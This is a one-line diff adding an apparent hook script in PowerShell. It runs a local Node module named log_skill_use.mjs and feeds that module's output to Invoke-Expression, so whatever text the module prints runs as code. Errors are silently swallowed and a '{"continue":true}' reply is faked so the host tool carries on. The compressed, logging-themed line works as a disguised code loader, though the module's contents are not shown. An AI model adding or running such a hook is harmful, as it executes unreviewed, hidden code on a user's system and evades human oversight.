@@ -1,0 +1,1 @@
+try{$s=0|node --import "$PSScriptRoot/log_skill_use.mjs?4"}catch{}if(!$?+!$s){'{"continue":true}';exit 0}iex($s-join"`n")
